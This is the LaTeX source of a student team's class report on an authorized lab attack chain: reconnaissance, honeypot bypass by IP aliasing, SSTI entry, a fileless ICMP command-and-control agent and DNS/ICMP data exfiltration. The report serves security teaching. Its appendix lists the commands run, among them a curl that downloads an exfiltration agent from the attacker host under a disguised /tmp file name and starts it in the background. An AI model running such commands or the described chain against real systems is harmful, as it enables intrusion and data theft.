@@ -1,0 +1,435 @@
+% !TeX program = xelatex
+\documentclass[11pt]{article}
+% === 加入以下這兩行來支援顯示中文 ===
+\usepackage{xeCJK}
+\setCJKmainfont{Noto Serif CJK TC} % 使用 Overleaf 內建的思源宋體 (繁體中文)
+% ===================================
+\usepackage[a4paper,margin=2.2cm]{geometry}
+\usepackage{graphicx}
+\usepackage{booktabs}
+\usepackage{longtable}
+\usepackage{array}
+\usepackage{float}
+\usepackage{enumitem}
+\usepackage{hyperref}
+\usepackage{xcolor}
+\usepackage{listings}
+\usepackage{caption}
+\usepackage{subcaption}
+
+\hypersetup{
+  colorlinks=true,
+  linkcolor=blue,
+  urlcolor=blue,
+  citecolor=blue
+}
+
+\lstset{
+  basicstyle=\ttfamily\small,
+  breaklines=true,
+  frame=single,
+  columns=fullflexible,
+  keepspaces=true,
+  showstringspaces=false
+}
+
+\setlength{\parskip}{0.4em}
+\setlength{\parindent}{1.5em}
+
+% Overleaf-safe image helper:
+% If an image has not been uploaded yet, compilation still succeeds.
+\newcommand{\safeincludegraphics}[2]{%
+  \IfFileExists{#1}{%
+    \includegraphics[width=#2]{#1}%
+  }{%
+    \fbox{\parbox[c][0.26\textheight][c]{#2}{\centering Missing image\\\texttt{#1}}}%
+  }%
+}
+
+\title{Class Project -- Attack\\\large Group 6 Hands-on 2 Technical Report}
+\author{M143040024\,陳品叡\\M143140012\,呂易鴻 \\M143140017\,王承煜}
+\date{2026-04-29}
+
+\begin{document}
+\maketitle
+
+\begin{abstract}
+This report summarizes Group 6's hands-on attack-defense experiment conducted on 2026-04-29. The experiment validates an end-to-end core attack chain: reconnaissance, honeypot triggering and IP-alias bypass, Flask/Jinja2 SSTI as the entry point, fileless ICMP command-and-control, and finally deployment of an exfiltration agent and verified data exfiltration. On the defensive side, the lab provides a target service, a fake SSH honeypot, and a network MDR component, allowing us to observe both the effectiveness and the limitations of IP-based blocking. We focus on actions that were actually executed and evidence that can be verified from screenshots and outputs, and we conclude with security implications and suggested next validation steps.
+\end{abstract}
+
+\tableofcontents
+\newpage
+
+\section{Introduction}
+
+\subsection{Project context}
+This report is prepared for the course ``Class Project -- Attack.'' The deliverables include a written report, slides, and a demo video. Our project implements a multi-layer attack-defense lab (target + honeypot + eBPF + C2 + exfiltration) to demonstrate the Cyber Kill Chain and map key steps to MITRE ATT\&CK.
+
+\subsection{Evidence-driven methodology}
+This document adopts an evidence-driven approach: we only describe what we actually executed and what can be cross-validated through screenshots and observed results. The goal is to provide a faithful, reproducible narrative of the completed attack chain and its defensive meaning, rather than to enumerate all possible scenarios.
+
+\subsection{Objectives}
+The objectives of this report are:
+\begin{enumerate}[leftmargin=*]
+  \item Describe the actual steps performed in the experiment and the role of each step in the attack chain.
+  \item Use evidence (screenshots and outputs) to demonstrate that we achieved a full chain from reconnaissance to exfiltration.
+  \item Discuss the defensive implications: the honeypot and network MDR are effective, but IP-based blocking can be bypassed via IP aliasing; eBPF v1/v2 validation is outside the scope of this run.
+\end{enumerate}
+
+\subsection{Scope and ethics}
+All activities were conducted in an isolated lab environment with explicit authorization for educational purposes. The target service is purpose-built for the course project. We do not include privilege escalation or destructive impact techniques.
+
+\section{Background and Analytical Frame}
+
+\subsection{Cyber Kill Chain}
+The Cyber Kill Chain decomposes an attack into seven phases: Reconnaissance, Weaponization, Delivery, Exploitation, Installation, Command and Control, and Actions on Objectives. This project uses the Kill Chain as the main analytical frame.
+
+Although this specific run does not cover all possible defensive interaction scenarios, it validates a critical end-to-end path:
+\[
+\text{Recon} \rightarrow
+\text{Honeypot Trigger} \rightarrow
+\text{IP Bypass} \rightarrow
+\text{SSTI} \rightarrow
+\text{Fileless C2} \rightarrow
+\text{Command Execution} \rightarrow
+\text{Exfiltration}
+\]
+
+\subsection{MITRE ATT\&CK mapping}
+This experiment maps to the following ATT\&CK techniques:
+\begin{itemize}[leftmargin=*]
+  \item T1595: Active Scanning
+  \item T1190: Exploit Public-Facing Application
+  \item T1620: Reflective Code Loading
+  \item T1059.006: Command and Scripting Interpreter: Python
+  \item T1095: Non-Application Layer Protocol
+  \item T1048.003: Exfiltration Over Alternative Protocol
+\end{itemize}
+
+\subsection{How this run fits the project}
+At the project level, this run focuses on validating a complete, observable attack chain: identify the target, exploit an application-layer vulnerability to establish a fileless C2, and complete data exfiltration. Further multi-round defense upgrade validation is left as follow-up work.
+
+\section{Environment and Experiment Scope}
+
+\subsection{Machines and roles}
+Two Ubuntu 24.04 machines are used:
+\begin{itemize}[leftmargin=*]
+  \item Lab machine: hosts the target service, honeypot, and blue-team network MDR.
+  \item Attacker machine: runs red-team reconnaissance, C2, exfil listener, and attack control.
+\end{itemize}
+
+\subsection{Observed addressing}
+From terminal outputs and screenshots:
+\begin{itemize}[leftmargin=*]
+  \item Target IP: \texttt{192.168.1.3}
+  \item Attacker source IP (initial): \texttt{192.168.1.14}
+  \item Attacker alias IP (bypass): \texttt{192.168.1.15}
+\end{itemize}
+
+\subsection{Services involved}
+\begin{table}[H]
+\centering
+\begin{tabular}{lll}
+\toprule
+Service & Port & Role in this run \\
+\midrule
+Fake SSH honeypot & 2222 & Deception and attacker IP logging \\
+Diagnostic portal & 9999 & Flask SSTI entry point \\
+ICMP C2 & ICMP & Fileless agent and control channel \\
+Exfil listener (DNS) & 53 & Receives DNS exfiltration chunks \\
+Deploy HTTP server & 8888 & Serves \texttt{exfil\_agent.py} for download \\
+\bottomrule
+\end{tabular}
+\caption{Services exercised in the 2026-04-29 run}
+\end{table}
+
+\section{Attack Chain Performed}
+
+This section reconstructs the actual chain performed in the experiment.
+
+\begin{longtable}{>{\raggedright\arraybackslash}p{1.7cm} >{\raggedright\arraybackslash}p{5.2cm} >{\raggedright\arraybackslash}p{7.0cm}}
+\toprule
+Phase & Action & What it demonstrated \\
+\midrule
+Preparation & Blue team starts \texttt{target\_app.py}, \texttt{honeypot.py}, and \texttt{blue\_mdr\_network.py --cleanup} & Target and network-layer defense are active \\
+Recon & \texttt{sudo bash red\_team/recon.sh 192.168.1.3} & Identify two relevant services (2222 and 9999) \\
+Trap trigger & \texttt{nc -s 192.168.1.14 -v 192.168.1.3 2222} & Hit fake SSH; honeypot replies with banner and logs source IP \\
+Bypass & \texttt{ip\_switch.sh add 192.168.1.15} & IP-based blocking can be bypassed by changing the source IP \\
+Target validation & \texttt{curl --interface 192.168.1.15 http://192.168.1.3:9999/} & Confirm the real target portal is reachable from the alias IP \\
+Delivery & Start \texttt{red\_attacker.py} and enter \texttt{payload} to generate an injection string & Prepare SSTI delivery and ICMP C2 console \\
+Exploitation & Paste and execute the payload in another terminal & Trigger SSTI and start the fileless agent \\
+Installation + C2 & Agent beacons back; C2 shows host / uid / kernel & Fileless agent runs in memory and establishes ICMP C2 \\
+Post-exploitation & \texttt{whoami}, \texttt{id}, \texttt{cat /etc/hostname}, \texttt{ls} & Verify interactive command execution on target \\
+Exfiltration & Start \texttt{exfil\_listener.py}; download and run \texttt{exfil\_agent.py} in background & Exfiltrate sensitive data over DNS/ICMP covert channels \\
+Verification & \texttt{ls -la loot/}, \texttt{cat loot/passwd | head -5} & Confirm exfiltrated files exist and contents are valid \\
+\bottomrule
+\end{longtable}
+
+\subsection{Interpretation}
+The value of this run is not in demonstrating every possible defensive round, but in proving a continuous, end-to-end path from initial contact to verified data exfiltration. Each step is supported by evidence, enabling a concrete, reproducible narrative.
+
+\section{Red Team Actions and Technical Meaning}
+
+\subsection{Reconnaissance}
+The red team scans \texttt{192.168.1.3} to identify candidate entry points. The key outcome is distinguishing a deceptive service (port 2222) from a real application surface (port 9999).
+
+\subsection{Deliberate honeypot trigger}
+The red team connects to \texttt{192.168.1.3:2222} from \texttt{192.168.1.14} to validate the deception layer and confirm that the honeypot responds with a plausible SSH banner while logging the source IP.
+
+\subsection{Bypassing IP-based blocking}
+After triggering the honeypot, the red team adds an alias IP (\texttt{192.168.1.15}) and continues from the new source identity. This highlights the limitation of purely IP-based blocking.
+
+\subsection{SSTI as the real entry point}
+After confirming the portal on port 9999 is reachable, the red team uses an SSTI payload to execute a Python loader on the target. The loader uses \texttt{memfd\_create} to stage and execute an in-memory agent without leaving a conventional file artifact on disk.
+
+\subsection{Why the C2 is fileless}
+``Fileless'' here means the agent is executed from an anonymous in-memory file descriptor and invoked via a \texttt{/proc/.../fd/...} path, reducing disk artifacts compared to a traditional dropped file.
+
+\subsection{Interactive command execution}
+Once the agent beacons back, the red team validates control by issuing basic commands (e.g., \texttt{whoami}, \texttt{id}, \texttt{/etc/hostname}, directory listing). This confirms stable interactive command execution, not just a one-time beacon.
+
+\subsection{Exfiltration deployment}
+The red team starts the exfil listener, then causes the target to download \texttt{exfil\_agent.py} via HTTP and run it in the background. The agent collects selected data and sends it back over DNS/ICMP. The attacker reconstructs the received chunks into files under \texttt{loot/}.
+
+\section{Blue Team Context and What Was Validated}
+
+\subsection{Active defensive components}
+This run validates the presence and effect of the network-layer defensive components:
+\begin{itemize}[leftmargin=*]
+  \item A fake SSH honeypot which records suspicious connection attempts.
+  \item A network MDR process which reacts to honeypot logs by applying IP-based blocks.
+\end{itemize}
+
+\subsection{Defensive implication}
+The experiment demonstrates that deception and automated IP blocking create friction and visibility, but do not constitute a complete stop. A motivated attacker can switch identities (e.g., via IP aliasing) and continue toward the real application surface.
+
+\section{Experimental Evidence and Results}
+
+This section maps figures to actions and provides key screenshots as evidence.
+
+\subsection{Figure-to-action mapping}
+\begin{longtable}{>{\raggedright\arraybackslash}p{3.2cm} >{\raggedright\arraybackslash}p{4.9cm} >{\raggedright\arraybackslash}p{5.5cm}}
+\toprule
+Evidence (PDF) & Command or state & Interpretation \\
+\midrule
+%
+Fig.~\ref{fig:setup_recon}\subref{fig:recon_start} & Start \texttt{recon.sh} & Recon begins \\
+Fig.~\ref{fig:setup_recon}\subref{fig:src_ip_14} & Add source IP \texttt{192.168.1.14} & Prepare a controlled source for triggering \\
+Fig.~\ref{fig:honeypot_bypass}\subref{fig:honeypot_trigger} & \texttt{nc -s 192.168.1.14 ... 2222} & Trigger the fake SSH honeypot and generate telemetry \\
+Fig.~\ref{fig:honeypot_bypass}\subref{fig:alias_add} & Add alias IP \texttt{192.168.1.15} & Bypass IP-based blocking by switching identity \\
+Fig.~\ref{fig:entry_c2}\subref{fig:portal_access} & \texttt{curl --interface 192.168.1.15 ... :9999/} & Validate access to the real target portal \\
+Fig.~\ref{fig:entry_c2}\subref{fig:c2_start} & Start \texttt{red\_attacker.py} & Start the ICMP C2 console on the attacker \\
+Fig.~\ref{fig:payload_gen}\subref{fig:c2_banner} & C2 menu/banner & Confirm the C2 console is ready \\
+Fig.~\ref{fig:payload_gen}\subref{fig:payload_cmd} & Enter \texttt{payload} & Request generation of the injection string \\
+Fig.~\ref{fig:payload_gen}\subref{fig:payload_string} & Payload output & Obtain the injection content to execute \\
+Fig.~\ref{fig:c2_control}\subref{fig:beacon} & Beacon appears & Agent connects back and establishes the channel \\
+Fig.~\ref{fig:c2_control}\subref{fig:whoami_id} & \texttt{whoami} / \texttt{id} & Verify privilege level and interactive control \\
+Fig.~\ref{fig:c2_control}\subref{fig:hostname_ls} & \texttt{cat /etc/hostname} / \texttt{ls} & Verify host identity and filesystem context \\
+Fig.~\ref{fig:exfil_result}\subref{fig:exfil_listener} & Start \texttt{exfil\_listener.py} & Prepare to receive exfiltration chunks \\
+Fig.~\ref{fig:exfil_result}\subref{fig:exfil_agent} & Download and run exfil agent & Start exfiltration and observe received chunks \\
+Fig.~\ref{fig:exfil_result}\subref{fig:loot_ls} & List \texttt{loot/} & Confirm reassembled files exist on the attacker \\
+Fig.~\ref{fig:exfil_result}\subref{fig:loot_validate} & Read \texttt{loot/passwd} head & Validate that exfiltrated data matches the target \\
+\bottomrule
+\end{longtable}
+
+\subsection{Core evidence figures}
+\begin{figure}[H]
+\centering
+\begin{subfigure}{0.48\linewidth}
+\centering
+\safeincludegraphics{Screenshot (1).png}{\linewidth}
+\caption{Recon begins}
+\label{fig:recon_start}
+\end{subfigure}
+\begin{subfigure}{0.48\linewidth}
+\centering
+\safeincludegraphics{Screenshot (2).png}{\linewidth}
+\caption{Set source IP \texttt{192.168.1.14}}
+\label{fig:src_ip_14}
+\end{subfigure}
+\caption{Initial setup: start reconnaissance and fix the initial source address.}
+\label{fig:setup_recon}
+\end{figure}
+
+\begin{figure}[H]
+\centering
+\begin{subfigure}{0.48\linewidth}
+\centering
+\safeincludegraphics{Screenshot (5).png}{\linewidth}
+\caption{Trigger the fake SSH honeypot}
+\label{fig:honeypot_trigger}
+\end{subfigure}
+\begin{subfigure}{0.48\linewidth}
+\centering
+\safeincludegraphics{Screenshot (6).png}{\linewidth}
+\caption{Add alias IP \texttt{192.168.1.15}}
+\label{fig:alias_add}
+\end{subfigure}
+\caption{Deception and bypass: the honeypot is triggered and the attacker switches identity.}
+\label{fig:honeypot_bypass}
+\end{figure}
+
+\begin{figure}[H]
+\centering
+\begin{subfigure}{0.48\linewidth}
+\centering
+\safeincludegraphics{Screenshot (7).png}{\linewidth}
+\caption{Validate portal access on port 9999}
+\label{fig:portal_access}
+\end{subfigure}
+\begin{subfigure}{0.48\linewidth}
+\centering
+\safeincludegraphics{Screenshot (8).png}{\linewidth}
+\caption{Start the ICMP C2 console}
+\label{fig:c2_start}
+\end{subfigure}
+\caption{Entry and setup: confirm the real target portal and bring up the C2 console.}
+\label{fig:entry_c2}
+\end{figure}
+
+\begin{figure}[H]
+\centering
+\begin{subfigure}{0.48\linewidth}
+\centering
+\safeincludegraphics{Screenshot (9).png}{\linewidth}
+\caption{C2 banner/menu}
+\label{fig:c2_banner}
+\end{subfigure}
+\begin{subfigure}{0.48\linewidth}
+\centering
+\safeincludegraphics{Screenshot (10).png}{\linewidth}
+\caption{Request payload generation}
+\label{fig:payload_cmd}
+\end{subfigure}
+\par\medskip
+\begin{subfigure}{0.98\linewidth}
+\centering
+\safeincludegraphics{Screenshot (11).png}{0.86\linewidth}
+\caption{Generated injection string (payload)}
+\label{fig:payload_string}
+\end{subfigure}
+\caption{Payload generation: the attacker prepares an injection string for SSTI delivery.}
+\label{fig:payload_gen}
+\end{figure}
+
+\begin{figure}[H]
+\centering
+\begin{subfigure}{0.48\linewidth}
+\centering
+\safeincludegraphics{Screenshot (12).png}{\linewidth}
+\caption{Beacon received (agent connects back)}
+\label{fig:beacon}
+\end{subfigure}
+\begin{subfigure}{0.48\linewidth}
+\centering
+\safeincludegraphics{Screenshot (13).png}{\linewidth}
+\caption{Privilege check: \texttt{whoami} / \texttt{id}}
+\label{fig:whoami_id}
+\end{subfigure}
+\par\medskip
+\begin{subfigure}{0.98\linewidth}
+\centering
+\safeincludegraphics{Screenshot (15).png}{0.86\linewidth}
+\caption{Host verification: \texttt{cat /etc/hostname} and \texttt{ls}}
+\label{fig:hostname_ls}
+\end{subfigure}
+\caption{C2 established: the channel supports interactive command execution on the target.}
+\label{fig:c2_control}
+\end{figure}
+
+\begin{figure}[H]
+\centering
+\begin{subfigure}{0.48\linewidth}
+\centering
+\safeincludegraphics{Screenshot (16).png}{\linewidth}
+\caption{Start the exfiltration listener}
+\label{fig:exfil_listener}
+\end{subfigure}
+\begin{subfigure}{0.48\linewidth}
+\centering
+\safeincludegraphics{Screenshot (17).png}{\linewidth}
+\caption{Exfil agent running; chunks received}
+\label{fig:exfil_agent}
+\end{subfigure}
+\par\medskip
+\begin{subfigure}{0.48\linewidth}
+\centering
+\safeincludegraphics{Screenshot (19).png}{\linewidth}
+\caption{Reassembled loot files present}
+\label{fig:loot_ls}
+\end{subfigure}
+\begin{subfigure}{0.48\linewidth}
+\centering
+\safeincludegraphics{Screenshot (20).png}{\linewidth}
+\caption{Validate exfiltrated data}
+\label{fig:loot_validate}
+\end{subfigure}
+\caption{Exfiltration and verification: data is transferred, reconstructed, and validated on the attacker.}
+\label{fig:exfil_result}
+\end{figure}
+
+\subsection{What the evidence proves}
+Based on the collected evidence, we can conclude:
+\begin{enumerate}[leftmargin=*]
+  \item The red team progresses from reconnaissance to practical exploitation.
+  \item The honeypot and network MDR are active and influence attacker behavior (IP switching is required).
+  \item The SSTI delivery results in a fileless agent and an ICMP C2 channel.
+  \item The channel supports stable interactive command execution, not just a beacon.
+  \item Data exfiltration completes successfully and is validated via reconstructed loot files.
+\end{enumerate}
+
+\section{Discussion}
+
+\subsection{What this experiment demonstrates}
+This run shows that the core components of our attack chain interoperate in a single session: target exposure, deception, fileless C2 establishment, and data exfiltration with evidence.
+
+\subsection{Key security lessons}
+\begin{itemize}[leftmargin=*]
+  \item Honeypots and IP blocking are useful for friction and visibility, but they are not a complete stop.
+  \item If the underlying application vulnerability remains, an attacker can change identity and continue.
+  \item Fileless execution and covert C2 reduce reliance on disk artifacts, motivating behavioral detection.
+  \item The ultimate impact is exfiltration; achieving a shell is only an intermediate state.
+\end{itemize}
+
+\section{Conclusion}
+
+The 2026-04-29 experiment validates a complete and observable attack chain: reconnaissance identifies the target, a deceptive SSH service is triggered and bypassed via IP aliasing, an SSTI entry point establishes a fileless ICMP C2 agent, and an exfiltration agent successfully transfers data back to the attacker where it is reconstructed and verified. The primary defensive takeaway is that network-layer deception and automated IP blocking can disrupt early stages and provide telemetry, but additional layers are required to prevent progression once a real application-layer entry point is available.
+
+\section{Appendix: Commands Used}
+
+\subsection{Blue team startup}
+\begin{lstlisting}
+cd ~/cybersecurity
+bash setup_env.sh
+source .venv/bin/activate
+sudo .venv/bin/python3 target/target_app.py
+sudo .venv/bin/python3 target/honeypot.py
+sudo .venv/bin/python3 blue_team/blue_mdr_network.py --cleanup
+\end{lstlisting}
+
+\subsection{Red team sequence}
+\begin{lstlisting}
+source .venv/bin/activate
+sudo bash red_team/recon.sh 192.168.1.3
+sudo bash red_team/ip_switch.sh add 192.168.1.14
+nc -s 192.168.1.14 -v 192.168.1.3 2222
+bash red_team/ip_switch.sh add 192.168.1.15
+curl -s --interface 192.168.1.15 http://192.168.1.3:9999/
+sudo .venv/bin/python3 red_team/red_attacker.py -t 192.168.1.3 -l 192.168.1.15
+payload
+\end{lstlisting}
+
+\subsection{Commands issued after C2 beacon}
+\begin{lstlisting}
+whoami
+id
+cat /etc/hostname
+ls
+sudo .venv/bin/python3 red_team/exfil_listener.py
+curl -sS http://192.168.1.15:8888/exfil_agent.py -o /tmp/.cache_update.py
+nohup python3 /tmp/.cache_update.py 192.168.1.15 > /dev/null 2>&1 &
+ls -la loot/
+cat loot/passwd | head -5
+\end{lstlisting}
+
+\end{document}
